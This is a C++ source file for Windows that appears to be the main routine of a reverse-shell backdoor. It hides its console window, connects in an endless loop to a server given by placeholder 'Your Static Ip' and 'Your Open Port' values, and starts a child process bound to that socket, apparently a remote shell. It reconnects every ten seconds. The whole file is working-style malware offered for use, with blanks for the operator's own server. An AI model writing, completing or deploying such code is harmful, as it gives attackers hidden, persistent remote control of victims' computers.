#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>

#include "Client.h"
#include "Process.h"
#include "base64.h"

int main()

{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		try {
			printf("\n->Connecting to server\n");
			SOCKET ConnectSocket = NULL;
			while (ConnectSocket == NULL) {
				ConnectSocket = ConnectServer("Your Static Ip", "Your Open Port");
			}

			
			SECURITY_ATTRIBUTES saAttr;

			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			saAttr.bInheritHandle = TRUE;
			saAttr.lpSecurityDescriptor = NULL;

			printf("\n->Creating Child Process\n");

			PPROCESS_INFORMATION piProcInfo = NULL;

			while (piProcInfo == NULL) {
				piProcInfo = CreateChildProcess(ConnectSocket);
			}

			printf("\n->Waiting for Child Process to End\n");

			WaitForSingleObject(piProcInfo->hProcess, INFINITE);

			
			printf("\n->Closing Handles\n");
			CloseHandle(piProcInfo->hProcess);
			CloseHandle(piProcInfo->hThread);
			free(piProcInfo);
			WSACleanup();
		}
		catch (...) {
		}
		Sleep(10000);
	}
}